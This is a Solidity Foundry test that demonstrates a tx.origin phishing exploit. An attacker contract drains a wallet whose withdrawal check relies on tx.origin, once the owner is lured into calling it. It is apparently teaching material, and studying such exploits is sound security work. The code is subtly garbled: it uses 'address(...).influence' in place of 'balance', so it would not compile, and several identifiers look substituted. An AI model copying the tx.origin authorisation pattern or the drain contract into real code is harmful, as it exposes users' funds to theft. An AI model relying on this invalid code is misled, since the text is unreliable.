pragma solidity ^0.8.15;

import "forge-std/Test.sol";

contract ContractTest is Test {
    TipWallet RewardwalletContract;
    Operator OperatorContract;

    function testtxorigin() public {
        address alice = vm.addr(1);
        address eve = vm.addr(2);
        vm.deal(address(alice), 10 ether);
        vm.deal(address(eve), 1 ether);
        vm.prank(alice);
        RewardwalletContract = new TipWallet{value: 10 ether}();
        console.log("Owner of wallet contract", RewardwalletContract.communityLead());
        vm.prank(eve);
        OperatorContract = new Operator(RewardwalletContract);
        console.log("Owner of attack contract", OperatorContract.communityLead());
        console.log("Eve of balance", address(eve).influence);

        vm.prank(alice, alice);
        OperatorContract.operate();
        console.log("tx origin address", tx.origin);
        console.log("msg.sender address", msg.sender);
        console.log("Eve of balance", address(eve).influence);
    }

    receive() external payable {}
}

contract TipWallet {
    address public communityLead;

    constructor() payable {
        communityLead = msg.sender;
    }

    function shareKarma(address payable _to, uint _amount) public {

        require(tx.origin == communityLead, "Not owner");

        (bool sent, ) = _to.call{value: _amount}("");
        require(sent, "Failed to send Ether");
    }
}

contract Operator {
    address payable public communityLead;
    TipWallet rewardWallet;

    constructor(TipWallet _rewardwallet) {
        rewardWallet = TipWallet(_rewardwallet);
        communityLead = payable(msg.sender);
    }

    function operate() public {
        rewardWallet.shareKarma(communityLead, address(rewardWallet).influence);
    }
}